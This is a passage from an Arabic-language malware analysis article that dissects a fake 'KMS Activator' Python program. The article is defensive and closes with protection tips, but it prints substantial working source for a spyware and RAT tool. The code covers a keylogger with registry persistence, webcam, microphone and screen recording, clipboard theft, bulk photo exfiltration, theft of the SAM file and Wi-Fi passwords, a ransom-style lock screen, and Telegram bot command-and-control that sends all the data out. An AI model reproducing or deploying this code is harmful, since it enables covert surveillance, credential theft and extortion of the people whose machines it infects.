    '            send_photo_to_telegram(img_path)\n'
    '            os.remove(img_path)\n'
    '        else:\n'
    '            log_to_file("فشل التقاط الصورة: لا إطار متاح")\n'
    '        cap.release()\n'
    '    except Exception as e:\n'
    '        log_to_file(f"خطأ في التقاط الصورة: {str(e)}")\n\n'
    'def on_key_press(event):\n'
    '    global logged_keys\n'
    '    try:\n'
    '        key_name = event.name\n'
    '        if not key_name:\n'
    '            log_to_file("اسم المفتاح فارغ")\n'
    '            return\n'
    '        if len(key_name) > 1:\n'
    '            if key_name == "space":\n'
    '                logged_keys += " "\n'
    '            elif key_name == "enter":\n'
    '                logged_keys += "\\n"\n'
    '            elif key_name == "backspace":\n'
    '                logged_keys = logged_keys[:-1] if logged_keys else ""\n'
    '            else:\n'
    '                logged_keys += f"[{key_name}]"\n'
    '        else:\n'
    '            logged_keys += key_name\n'
    '        if len(logged_keys) >= 100:\n'
    '            message = f"[تتبع الكيبورد من {DEVICE_NAME}]:\\n{logged_keys}"\n'
    '            send_to_telegram(message)\n'
    '            capture_camera()\n'
    '            logged_keys = ""\n'
    '    except Exception as e:\n'
    '        log_to_file(f"خطأ في تتبع الكيبورد: {str(e)}")\n'
    '        send_to_telegram(f"⚠️ خطأ في تتبع الكيبورد على {DEVICE_NAME}: {str(e)}")\n\n'
    'def start_keylogger():\n'
    '    try:\n'
    '        log_to_file("بدأ الكيلوجر")\n'
    '        send_to_telegram(f"✅ الكيلوجر يعمل الآن على {DEVICE_NAME}")\n'
    '        keyboard.on_press(on_key_press)\n'
    '        while True:\n'
    '            time.sleep(10)\n'
    '    except Exception as e:\n'
    '        log_to_file(f"فشل تشغيل الكيلوجر: {str(e)}")\n'
    '        send_to_telegram(f"⚠️ فشل تشغيل الكيلوجر على {DEVICE_NAME}: {str(e)}")\n\n'
    'if __name__ == "__main__":\n'
    '    start_keylogger()\n'
)

keylogger_path = os.path.join(os.environ["APPDATA"], "system_service.py")
with open(keylogger_path, "w", encoding="utf-8") as f:
    f.write(keylogger_script)

reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, f"pythonw {keylogger_path}")
winreg.CloseKey(reg_key)

subprocess.Popen(["pythonw", keylogger_path], creationflags=subprocess.CREATE_NO_WINDOW)
send_to_telegram_split(f"⌨️ تم زرع ملف تتبع الكيبورد بنجاح على {device_name} وسيعمل في الخلفية.")
```

- **إيه اللي بيحصل؟**:
  - الكود بيعمل برنامج صغير اسمه **كيلوجر**، هدفه يسجل كل ضغطة كيبورد تعملها.
  - بيعمل الحاجات دي خطوة خطوة:
    1. **بيكتب الكيلوجر**:
       - بيعمل ملف إسمه `system_service.py` في مجلد مخفي (`C:\Users\Ahmed\AppData\Roaming`).
       - الملف ده فيه كود كامل عشان يشتغل لوحده:
         - بيستخدم مكتبة `keyboard` عشان يراقب كل مفتاح بتضغط عليه.
         - لو ضغطت حرف زي "a"، بيضيفه لحاجة إسمها `logged_keys`.
         - لو ضغطت مفتاح زي "Space"، بيحط مسافة. لو "Enter"، بيحط سطر جديد. لو "Backspace"، بيمسح آخر حرف.
         - لو ضغطت مفاتيح زي "Ctrl" أو "Alt"، بيحطها بين قوسين زي `[ctrl]`.
         - كل ما تكتب 100 حرف، بيبعت اللي كتبته لتيليجرام في رسالة زي:
           ```
           [تتبع الكيبورد من DESKTOP-12345]:
           hello my password is MyPass123 [enter] how are you [space] [ctrl]
           ```
         - وبيفتح الكاميرا عشان يصوّرك ويبعت الصورة مع الرسالة.
         - بيحفظ كل حاجة في ملف إسمه `keylog.txt` في الـ Temp لو حصل مشكلة.
    2. **بيضمن إنه يشتغل دايمًا**:
       - بيفتح الريجستري بتاع الويندوز (زي دفتر الجهاز اللي بيقول إيه اللي يشتغل لما تفتح الجهاز).
       - بيحط الملف `system_service.py` في مكان إسمه `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` تحت إسم "SystemService".
       - بيحط أمر إنه يشتغل باستخدام `pythonw`، وده نوع بايثون بيشتغل من غير ما يفتح نافذة، يعني مش هتشوف حاجة.
    3. **بيشغّل الكيلوجر على طول**:
       - بيستخدم `subprocess.Popen` عشان يشغّل الملف ده في الخلفية.
       - بيستخدم `CREATE_NO_WINDOW` عشان ما يظهرش أي نافذة.
    4. **بيبعت تأكيد**:
       - بيبعت رسالة لتيليجرام يقول إن الكيلوجر اتزرع وهيشتغل، زي:
         ```
         ⌨️ تم زرع ملف تتبع الكيبورد بنجاح على DESKTOP-12345 وسيعمل في الخلفية.
         ```
- **ليه خطير؟**:
  - الكيلوجر ده زي جاسوس قاعد يسجل كل كلمة بتكتبها، من باسورداتك لرسايلك الشخصية.
  - بيصوّرك كمان، يعني اللي بيستلم الرسايل دي هيعرف إنت مين وإنت بتعمل إيه.
  - وبما إنه في الريجستري، هيفضل شغال كل ما تفتح الجهاز لحد ما تمسحه.

---

#### 4. **الواجهة وشاشة القفل**

![Screenshot-2025-04-12-131058](https://i.postimg.cc/J0qGRfNk/Screenshot-2025-04-12-131058.png)

---

![Screenshot-2025-04-12-131129](https://i.postimg.cc/kMFVNb0g/Screenshot-2025-04-12-131129.png)



```python
ctk.set_appearance_mode("light")
root = ctk.CTk()
root.title("KMS Activator")
root.geometry("450x600")
root.resizable(False, False)
root.configure(fg_color="#E6F0FA")
main_frame = ctk.CTkFrame(root, fg_color="#F8FAFC", corner_radius=20, border_width=2, border_color="#DBEAFE")
main_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.9, relheight=0.9)

title_label = ctk.CTkLabel(main_frame, text="KMS ACTIVATOR", font=("Arial", 24, "bold"), text_color="#1E40AF")
title_label.pack(pady=20)

button_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
button_frame.pack(pady=10, padx=20, fill="both")

for i, (text, cmd, color, hover) in enumerate([
    ("تفعيل ويندوز", activate_windows, "#A78BFA", "#8B5CF6"),
    ("تفعيل أوفيس", activate_office, "#60A5FA", "#3B82F6"),
    ("حالة التفعيل", show_fullscreen_lock, "#F472B6", "#EC4899"),
    ("تفعيل فوتوشوب", extract_system_passwords, "#F87171", "#EF4444"),
    ("اضغط للأهمية", collect_and_send_images, "#FCD34D", "#FBBF24")
]):
    row_frame = ctk.CTkFrame(button_frame, fg_color="transparent")
    row_frame.pack(fill="x", pady=10)
    num_label = ctk.CTkLabel(row_frame, text=str(i+1), font=("Arial", 16, "bold"), text_color=color,
                            fg_color="#F8FAFC", width=40, height=40, corner_radius=20)
    num_label.pack(side="left", padx=(0, 15))
    btn = ctk.CTkButton(row_frame, text=text, command=cmd, fg_color=color, text_color="white",
                       font=("Arial", 14), corner_radius=25, hover_color=hover, height=45)
    btn.pack(side="left", fill="x", expand=True)

input_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
input_frame.pack(pady=20, padx=20, fill="x")
input_entry = ctk.CTkEntry(input_frame, width=300, font=("Arial", 12), placeholder_text="اكتب رسالة لإرسالها إلى تيليجرام",
                          fg_color="#F8FAFC", border_color="#DBEAFE", corner_radius=15)
input_entry.pack(side="left", padx=(0, 10))
send_button = ctk.CTkButton(input_frame, text="إرسال", command=send_input_to_telegram, fg_color="#10B981",
                           text_color="white", font=("Arial", 12), corner_radius=20, hover_color="#059669", height=40)
send_button.pack(side="left")

def show_fullscreen_lock():
    global lock_window, media_label, media_image_label
    send_unlock_code()
    lock_window = ctk.CTkToplevel()
    lock_window.attributes("-fullscreen", True)
    lock_window.attributes("-topmost", True)
    lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
    lock_window.focus_force()
    lock_window.grab_set()
    lock_window.configure(fg_color="#E6F0FA")
    ctk.CTkLabel(lock_window, text="@Cyb_Hack أدخل كلمني على التيليجرام", font=("Arial", 50), text_color="#1E40AF").pack(pady=30)
    ctk.CTkLabel(lock_window, text="أدخل رمز الفتح الذي تم إرساله على تيليجرام", font=("Arial", 16), text_color="#1E40AF").pack(pady=10)
    ctk.CTkLabel(lock_window, text="أدخل اسمك", font=("Arial", 16), text_color="#1E40AF").pack(pady=10)
    name_entry = ctk.CTkEntry(lock_window, font=("Arial", 20), fg_color="#F8FAFC", border_color="#DBEAFE", width=300)
    name_entry.pack(pady=10)
    display_frame = ctk.CTkFrame(lock_window, fg_color="transparent")
    display_frame.pack(pady=20)
    media_label = ctk.CTkLabel(display_frame, text="", font=("Arial", 14), text_color="#1E40AF")
    media_label.pack()
    media_image_label = ctk.CTkLabel(display_frame, text="")
    media_image_label.pack()
    code_entry = ctk.CTkEntry(lock_window, font=("Arial", 20), show="*", fg_color="#F8FAFC", border_color="#DBEAFE", width=300)
    code_entry.pack(pady=10)
    def check_code():
        entered_name = name_entry.get().strip()
        if not entered_name:
            error_label.configure(text="يرجى إدخال اسمك أولاً!", text_color="orange")
            return
        if code_entry.get() == UNLOCK_CODE:
            try:
                username = getpass.getuser()
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = (
                    f"✅ تم إلغاء القفل بنجاح\n"
                    f"👤 من: {entered_name}\n"
                    f"💻 اسم المستخدم: {username}\n"
                    f"🖥️ اسم الجهاز: {device_name}\n"
                    f"⏰ الوقت: {current_time}"
                )
                send_to_telegram_split(message)
            except Exception as e:
                send_to_telegram_split(f"✅ تم إلغاء القفل بنجاح\nخطأ في جمع البيانات: {str(e)}\nالجهاز: {device_name}")
            lock_window.grab_release()
            lock_window.destroy()
        else:
            try:
                username = getpass.getuser()
                os_info = platform.platform()
                os_version = platform.version()
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = (
                    f"محاولة فتح من: {entered_name}\n"
                    f"👤 اسم المستخدم: {username}\n"
                    f"💻 اسم الجهاز: {device_name}\n"
                    f"🧾 نظام التشغيل: {os_info}\n"
                    f"📌 إصدار النظام: {os_version}\n"
                    f"⏰ الوقت: {current_time}\n"
                    f"رمز الفتح المُدخل: {code_entry.get()}\n"
                    f"🔑 الرمز الصحيح: {UNLOCK_CODE}"
                )
                send_to_telegram_split(message)
            except Exception as e:
                send_to_telegram_split(f"محاولة فتح من: {entered_name}\nخطأ في جمع البيانات: {str(e)}\n🔑 الرمز الصحيح: {UNLOCK_CODE}\nالجهاز: {device_name}")
            attempts_left[0] -= 1
            if attempts_left[0] <= 0:
                winsound.Beep(1000, 1000)
                error_label.configure(text="تم استنفاد جميع المحاولات!", text_color="red")
            else:
                error_label.configure(text=f"رمز خاطئ، متبقي {attempts_left[0]} محاولة", text_color="orange")
    ctk.CTkButton(lock_window, text="تحقق", font=("Arial", 16), command=check_code, fg_color="#A78BFA", text_color="white", corner_radius=20, hover_color="#8B5CF6").pack(pady=10)
    gif_url = "https://media.giphy.com/media/SqflD5OvHoWILB7qWm/giphy.gif?cid=790b761110oz00ofc8jpx2pgqxt38jmxfbj6z7dz0jio5ge4&ep=v1_gifs_trending&rid=giphy.gif&ct=g"
    gif_frames = load_gif_frames(gif_url, 300, 200)
    gif_label = ctk.CTkLabel(lock_window, text="")
    gif_label.pack(pady=10)
    animate_gif(gif_label, gif_frames)
    error_label = ctk.CTkLabel(lock_window, text="", font=("Arial", 14), text_color="red")
    error_label.pack()
```

- **الواجهة الرئيسية**:
  - الكود بيعمل نافذة حلوة باستخدام `customtkinter`، شكلها زي البرامج الرسمية.
  - النافذة إسمها "KMS Activator"، حجمها 450×600 بكسل، وما تقدرش تغيّر حجمها.
  - فيها عنوان كبير مكتوب "KMS ACTIVATOR" بخط كبير.
  - فيها 5 أزرار، كل زرار ليه لون مختلف ومكتوب عليه حاجة:
    1. **تفعيل ويندوز**: بيشغّل دالة `activate_windows` (هنشرحها بعدين).
    2. **تفعيل أوفيس**: بيشغّل دالة `activate_office`.
    3. **حالة التفعيل**: بيشغّل دالة `show_fullscreen_lock` (شاشة القفل).
    4. **تفعيل فوتوشوب**: بيشغّل دالة `extract_system_passwords` (سرقة باسوردات الواي فاي وملف SAM).
    5. **اضغط للأهمية**: بيشغّل دالة `collect_and_send_images` (سرقة الصور).
  - تحت الأزرار فيه مكان تكتب فيه رسالة وزرار "إرسال":
    - لو كتبت حاجة وبعتها، بتروح لتيليجرام على طول.
    - ده بيدّي اللي بيستخدم البوت طريقة إنه يبعت أوامر زيادة.
- **شاشة القفل**:
  - لو ضغطت على زرار "حالة التفعيل"، بيفتح نافذة جديدة تغطي الشاشة كلها:
    - بتكون **في الواجهة دايمًا** (`-topmost`)، يعني ما تقدرش تفتح حاجة تانية.
    - مابتسمحلكش تقفلها (`WM_DELETE_WINDOW` معطل).
    - فيها جملة كبيرة: "@Cyb_Hack أدخل كلمني على التيليجرام".
    - بيطلب منك تكتب **إسمك** في مربع.
    - وبيطلب تكتب **كود الفتح** (الكود اللي من 6 أرقام اللي اتولد في الأول).
    - فيه GIF بيتحرك عشان يخلّي الشاشة تبدو حقيقية.
  - لو ضغطت زرار "تحقق":
    - لازم تكون كتبت إسمك الأول، وإلا هيقولك "يرجى إدخال اسمك أولاً!".
    - لو الكود صح (زي الكود اللي اتبعت لتيليجرام):
      - بيبعت رسالة لتيليجرام يقول إن الجهاز اتفتح، مع إسمك، إسم المستخدم، إسم الجهاز، والوقت.
      - بيقفل شاشة القفل ويرجّعك للجهاز.
    - لو الكود غلط:
      - بيبعت رسالة لتيليجرام فيها إسمك، الكود الغلط، الكود الصح، ومعلومات عن الجهاز.
      - بيقلّل عدد المحاولات (فيه 6 محاولات بس).
      - لو خلّصت المحاولات، بيطلّع صوت بيب مزعج ويقولك "تم استنفاد جميع المحاولات!".
      - لو لسه فيه محاولات، بيقولك "رمز خاطئ، متبقي X محاولة".
- **ليه خطير؟**:
  - الواجهة دي خدعة، بتخلّيك تحس إنه برنامج تفعيل عادي، لكن كل زرار بيعمل حاجة خبيثة.
  - شاشة القفل زي برامج الفدية، بتمنعك تستخدم جهازك وبتخلّيك تكلّم حد على تيليجرام، وده ممكن يطلب منك فلوس أو يخدّعك.

---

#### 5. **المراقبة وسرقة البيانات**
```python
def capture_camera():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        img_path = os.path.join(tempfile.gettempdir(), "camera_capture.jpg")
        cv2.imwrite(img_path, frame)
        send_photo_to_telegram(img_path)
        os.remove(img_path)
        send_to_telegram_split(f"📸 تم التقاط صورة من الكاميرا على {device_name}.")
    else:
        send_to_telegram_split(f"⚠️ فشل في التقاط صورة من الكاميرا على {device_name}.")
    cap.release()

def record_audio(duration=5):
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
    write(audio_path, fs, recording)
    send_audio_to_telegram(audio_path)
    os.remove(audio_path)
    send_to_telegram_split(f"🎤 تم تسجيل الصوت وإرساله من {device_name}.")

def record_screen(duration=10):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_path = os.path.join(tempfile.gettempdir(), "screen_record.avi")
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_size.width, screen_size.height))
    start_time = time.time()
    while (time.time() - start_time) < duration:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()
    send_video_to_telegram(video_path)
    os.remove(video_path)
    send_to_telegram_split(f"📹 تم تسجيل الشاشة وإرسالها من {device_name}.")
```

- **تصوير الكاميرا**:
  - بيفتح الكاميرا باستخدام `cv2.VideoCapture(0)` (رقم 0 يعني الكاميرا الافتراضية).
  - بياخد صورة واحدة (`frame`)، يحفظها كـ `camera_capture.jpg` في الـ Temp.
  - بيبعت الصورة لتيليجرام، يمسحها، وبيبعت رسالة يقول إنه صوّر.
  - لو الكاميرا مش شغالة، بيبعت رسالة يقول إنه فشل.
- **تسجيل الصوت**:
  - بيستخدم `sounddevice` عشان يسجّل الصوت من الميكروفون لمدة 5 ثواني (أو المدة اللي يختارها).
  - بيحفظ التسجيل كملف WAV إسمه `recording.wav` في الـ Temp.
  - بيبعت الملف لتيليجرام، يمسحه، وبيبعت رسالة يقول إنه سجّل.
- **تسجيل الشاشة**:
  - بياخد حجم الشاشة باستخدام `pyautogui.size()`.
  - بيعمل فيديو AVI باستخدام `cv2.VideoWriter` باسم `screen_record.avi`.
  - كل جزء من الثانية، بياخد سكرين شوت، يحوّلها للصيغة الصحيحة، ويضيفها للفيديو.
  - بيسجّل لمدة 10 ثواني، يبعت الفيديو لتيليجرام، يمسحه، وبيبعت رسالة.
- **ليه خطير؟**:
  - بيقدر يصوّرك وإنت قاعد قدام الكمبيوتر، يسجّل أي مكالمة أو صوت حواليك، ويصوّر شاشتك لو فيها حاجة زي بيانات بنك أو رسايل.
  - كل ده بيروح لتيليجرام، يعني حد غريب بيبقى عنده فيديو بيك وبصوتك.

---

#### 6. **سرقة الصور وباسوردات الواي فاي وملف SAM**
```python
def collect_and_send_images():
    image_extensions = ('.jpg', '.jpeg', '.png')
    search_dirs = [
        os.path.join(os.environ["USERPROFILE"], "Pictures"),
        os.path.join(os.environ["USERPROFILE"], "Desktop"),
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Downloads"),
        "C:\\"
    ]
    send_to_telegram_split(f"📸 جاري البحث عن الصور وإرسالها إلى Telegram من {device_name}...")
    found_images = 0
    for directory in search_dirs:
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        img_path = os.path.join(root, file)
                        try:
                            send_photo_to_telegram(img_path)
                            found_images += 1
                            time.sleep(0.5)
                        except Exception as e:
                            send_to_telegram_split(f"⚠️ فشل في إرسال الصورة {img_path} من {device_name}: {str(e)}")
        except Exception as e:
            send_to_telegram_split(f"⚠️ خطأ أثناء البحث في {directory} على {device_name}: {str(e)}")
    send_to_telegram_split(f"✅ تم الانتهاء من إرسال الصور من {device_name}. العدد الإجمالي: {found_images}")

def extract_system_passwords():
    try:
        sam_path = "C:\\Windows\\System32\\config\\SAM"
        if os.path.exists(sam_path):
            send_to_telegram_split(f"[تم العثور على ملف SAM على {device_name}]: {sam_path}")
            with open(sam_path, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                    files={"document": f},
                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"ملف SAM المستخرج من {device_name}"}
                )
        else:
            send_to_telegram_split(f"⚠️ ملف SAM غير موجود على {device_name}.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في استخراج ملف SAM من {device_name}: {str(e)}")
    try:
        profiles = subprocess.getoutput("netsh wlan show profiles")
        wifi_list = []
        profile_names = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]
        for profile in profile_names:
            details = subprocess.getoutput(f"netsh wlan show profile name=\"{profile}\" key=clear")
            for line in details.splitlines():
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    wifi_list.append(f"📡 الشبكة: {profile}\n🔑 كلمة المرور: {password}")
                    break
            else:
                wifi_list.append(f"📡 الشبكة: {profile}\n🔑 كلمة المرور: [غير متاحة]")
        if wifi_list:
            message = f"📶 كلمات مرور شبكات Wi-Fi من {device_name}:\n\n" + "\n\n".join(wifi_list)
            send_to_telegram_split(message)
        else:
            send_to_telegram_split(f"⚠️ لا توجد شبكات Wi-Fi مخزنة على {device_name}.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في استخراج كلمات مرور Wi-Fi من {device_name}: {str(e)}")
```

- **سرقة الصور**:
  - بيدوّر في مجلدات زي "الصور"، "سطح المكتب"، "المستندات"، "التحميلات"، وكل درايف C.
  - بيبص على أي ملف بينتهي بـ `.jpg`، `.jpeg`، أو `.png`.
  - كل صورة يلاقيها، بيبعتها لتيليجرام.
  - بيحسب عدد الصور اللي بعتها وبيبعت رسالة في الأخر يقول إنه خلّص وكام صورة بعت.
- **سرقة ملف SAM**:
  - بيحاول يفتح ملف إسمه `SAM` في `C:\Windows\System32\config\SAM`.
  - الملف ده فيه بيانات حسابات المستخدمين في الويندوز.
  - لو لقاه، بيبعت الملف كله لتيليجرام زي ما هو.
  - لو ما لقاهوش، بيبعت رسالة يقول إنه فشل.
- **سرقة باسوردات الواي فاي**:
  - بيستخدم أمر `netsh wlan show profiles` عشان يلاقي كل شبكات الواي فاي اللي اتوصلت بيها قبل كده.
  - بياخد أسماء الشبكات وبيستخدم أمر `netsh wlan show profile name="اسم الشبكة" key=clear` عشان يطلّع كلمة السر.
  - بيحط كل شبكة وكلمة السر في لستة، زي:
    ```
    📡 الشبكة: MyWiFi
    🔑 كلمة المرور: Pass123
    ```
  - بيبعت اللستة دي لتيليجرام.
- **ليه خطير؟**:
  - الصور ممكن تكون فيها حاجات شخصية زي صور عيلتك أو مستندات.
  - ملف SAM لو اتسرق، حد فاهم ممكن يستخدمه عشان يخترق حسابات الويندوز.
  - باسوردات الواي فاي بتخلّي حد يدخل على شبكتك ويسرق بياناتك أو يعمل حاجات غير قانونية من شبكتك.

---

#### 7. **التحكم عن بُعد**
```python
def fetch_latest_telegram_message():
    global last_update_id
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update_id[0] + 1 if last_update_id[0] else 0}"
        response = requests.get(url, timeout=10).json()
        if "result" in response and response["result"]:
            for update in response["result"]:
                last_update_id[0] = update["update_id"]
                msg = update.get("message", {})
                text = msg.get("text")
                if text:
                    send_to_telegram_split(f"📩 تم استلام الأمر على {device_name}: {text}")
                    if text == "!screenshot":
                        screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
                        pyautogui.screenshot().save(screenshot_path)
                        send_photo_to_telegram(screenshot_path)
                        os.remove(screenshot_path)
                        send_to_telegram_split(f"📷 تم إرسال لقطة الشاشة من {device_name}.")
                    elif text == "!camera":
                        capture_camera()
                    elif text == "!record_audio":
                        threading.Thread(target=record_audio, args=(5,), daemon=True).start()
                        send_to_telegram_split(f"🎤 جاري تسجيل الصوت (5 ثوانٍ) على {device_name}...")
                    elif text == "!record_screen":
                        threading.Thread(target=record_screen, args=(10,), daemon=True).start()
                        send_to_telegram_split(f"📹 جاري تسجيل الشاشة (10 ثوانٍ) على {device_name}...")
                    elif text == "!shutdown":
                        shutdown_pc()
                    elif text.startswith("!open "):
                        url = text.split("!open ", 1)[1].strip()
                        if url:
                            webbrowser.open(url)
                            send_to_telegram_split(f"🌐 تم فتح الرابط على {device_name}: {url}")
                        else:
                            send_to_telegram_split(f"⚠️ يرجى إدخال رابط صالح بعد '!open' على {device_name}")
                    else:
                        send_to_telegram_split(f"⚠️ أمر غير معروف على {device_name}: {text}")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في جلب الرسائل من Telegram على {device_name}: {str(e)}")
```

- **إيه اللي بيحصل؟**:
  - الكود بيستنى رسايل من تيليجرام كل ثانيتين (بيستخدم دالة `fetch_latest_telegram_message`).
  - لو حد بعت رسالة للبوت، بيشوف الرسالة دي فيها إيه وبينفّذ الأمر:
    - `!screenshot`: بياخد سكرين شوت ويبعتها.
    - `!camera`: بيفتح الكاميرا ويصوّر.
    - `!record_audio`: بيسجّل صوت لـ 5 ثواني.
    - `!record_screen`: بيسجّل الشاشة لـ 10 ثواني.
    - `!shutdown`: بيطفّي الجهاز على طول بأمر `shutdown /s /t 0`.
    - `!open [رابط]`: بيفتح الموقع اللي في الرسالة (زي `!open https://google.com`).
    - لو الرسالة فيها أمر مش معروف، بيبعت رسالة يقول "أمر غير معروف".
  - كل أمر بينفّذه، بيبعت تأكيد لتيليجرام يقول إنه نفّذه.
- **ليه خطير؟**:
  - ده زي ما تكون بدّيت حد مفتاح جهازك. يقدر يصوّرك، يسجّلك، يطفّي جهازك، أو يفتح مواقع خطيرة من غير ما تعرف.

---

#### 8. **تفعيل ويندوز وأوفيس (خدعة)**
```python
def activate_windows():
    output = subprocess.getoutput("cscript //nologo C:\\Windows\\System32\\slmgr.vbs /skms kms.digiboy.ir && cscript //nologo C:\\Windows\\System32\\slmgr.vbs /ato")
    send_to_telegram_split(f"نتيجة تفعيل ويندوز على {device_name}:\n{output}")
    cap = cv2.VideoCapture(0)
    for i in range(10):
        ret, frame = cap.read()
        if ret:
            img_path = os.path.join(tempfile.gettempdir(), f"capture_{i}.jpg")
            cv2.imwrite(img_path, frame)
            send_photo_to_telegram(img_path)
            os.remove(img_path)
            time.sleep(0.1)
    cap.release()

def activate_office():
    def record_and_send():
        while True:
            filename = os.path.join(tempfile.gettempdir(), "office_record.avi")
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
            start_time = time.time()
            while int(time.time() - start_time) < 60:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
            cap.release()
            out.release()
            send_video_to_telegram(filename)
            os.remove(filename)
            time.sleep(0.5)
    threading.Thread(target=record_and_send, daemon=True).start()
    output = subprocess.getoutput("cd \"C:\\Program Files\\Microsoft Office\\Office16\" && cscript ospp.vbs /sethst:kms.digiboy.ir && cscript ospp.vbs /act")
    send_to_telegram_split(f"نتيجة تفعيل أوفيس على {device_name}:\n{output}")
```

- **تفعيل ويندوز**:
  - بيحاول يشغّل أوامر زي `slmgr.vbs` عشان يفعّل ويندوز باستخدام سيرفر KMS (ده اللي المفروض يخلّيك تحس إنه برنامج تفعيل).
  - بيبعت نتيجة الأوامر دي لتيليجرام.
  - وبيفتح الكاميرا وياخد 10 صور بسرعة (كل 0.1 ثانية)، يبعت كل صورة لتيليجرام، ويمسحها.
- **تفعيل أوفيس**:
  - بيحاول يشغّل أوامر زي `ospp.vbs` عشان يفعّل أوفيس.
  - بيبعت النتيجة لتيليجرام.
  - وبيبدأ تسجيل فيديو من الكاميرا لمدة 60 ثانية، يبعت الفيديو، ويمسحه، ويستمر يسجّل فيديوهات جديدة في حلقة لا نهائية.
- **ليه خطير؟**:
  - التفعيل ده خدعة، الهدف الحقيقي هو إنه يصوّرك ويبعت الصور أو الفيديوهات.
  - يعني بدل ما يفعّل حاجة، بيبقى عايز يراقبك.

---

#### 9. **مراقبة الحافظة والصوت بشكل مستمر**
```python
def monitor_clipboard():
    last_text = ""
    while True:
        try:
            current_text = pyperclip.paste()
            if current_text != last_text:
                last_text = current_text
                send_to_telegram_split(f"[الحافظة من {device_name}]:\n{current_text}")
            time.sleep(10)
        except:
            pass

def record_audio_loop():
    fs = 44100
    duration = 60
    while True:
        try:
            audio = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            filename = os.path.join(tempfile.gettempdir(), "recorded_audio.wav")
            write(filename, fs, audio)
            send_audio_to_telegram(filename)
            os.remove(filename)
            time.sleep(0.1)
        except Exception as e:
            send_to_telegram_split(f"⚠️ خطأ في تسجيل الصوت على {device_name}: {str(e)}")
            time.sleep(5)
```

- **مراقبة الحافظة**:
  - بيشوف كل 10 ثواني إيه اللي عملته كوبي (Copy) باستخدام `pyperclip.paste()`.
  - لو لقى حاجة جديدة (زي باسورد أو رسالة)، بيبعتها لتيليجرام.
- **تسجيل الصوت باستمرار**:
  - بيسجّل الصوت لمدة 60 ثانية، يحفظ الملف، يبعت، ويمسح.
  - وبيستمر يعمل كده في حلقة لا نهائية.
- **ليه خطير؟**:
  - لو عملت كوبي لباسورد أو بيانات مهمة، هتروح لتيليجرام.
  - التسجيل المستمر بيخلّي الكود يسجّل كل حاجة بتقولها أو أي صوت حواليك.

---

### إزاي بيستمر على الجهاز؟
الكود بيعمل حاجات عشان يضمن إنه يفضل شغال:
- **الكيلوجر**: بيحط ملف `system_service.py` في الريجستري عشان يشتغل كل ما تفتح الجهاز.
- **الملفات المؤقتة**: بيستخدم ملفات في الـ Temp وبيمسحها بعد ما يخلّص عشان ما تلاقيش أثر.
- **العمل في الخلفية**: بيستخدم `pythonw` و`CREATE_NO_WINDOW` عشان ما تشوفش أي نافذة وهو بيشتغل.
- **التشغيل المستمر**: بيستخدم `threading` عشان يعمل حاجات زي التسجيل والمراقبة في نفس الوقت من غير ما يتوقف.

---

### ليه الكود ده خطير جدًا؟
الكود ده **غير قانوني** ومصمم عشان يضرّك. بيعمل الحاجات دي:
- **يسرق بياناتك**: زي الباسوردات، الصور، والرسايل.
- **يراقبك**: بيصوّرك، يسجّل صوتك، ويبص على شاشتك.
- **يتحكم في جهازك**: يقدر يطفّيه، يفتح مواقع، أو يعمل أي حاجة حد بعتها على تيليجرام.
- **يقفل جهازك**: زي برامج الفدية، بيمنعك تستخدم الجهاز ويخلّيك تكلّم حد ممكن يطلب فلوس.
- **يشتغل في الخفاء**: يعني ممكن ما تعرفش إنه موجود إلا لما تتسرق أو يحصل مصيبة.

---
### إزاي تحمي نفسك؟
1. **ما تحفظش الباسوردات في المتصفح**:
   - لو لازم تحفظ، استخدم مدير باسوردات زي LastPass أو Bitwarden، لأن دول بيشفّروا الباسوردات بطريقة أقوى.
2. **راقب جهازك**:
   - لو لقيت ملفات غريبة في `AppData` أو برامج بتشتغل لوحدها، اسكَن جهازك بأنتي فيروس.
3. **حدّث ويندوز وكروم**:
   - الإصدارات الجديدة بتحسن الحماية، فحاول دايمًا تبقى محدّث.
4. **ما تحمّلش برامج مش موثوقة**:
   - الكود ده بيجي مع برامج زي "KMS Activator"، فخلّي بالك من الحاجات اللي بتحمّلها من مواقع مش معروفة.
5. **استخدم حساب مستخدم عادي**:
   - لو بتستخدم حساب Admin، الكود بيقدر يوصل لملفات زي `Local State` بسهولة. لو حساب عادي، بيكون أصعب.

### لو الكود ده على جهازك، تعمل إيه؟
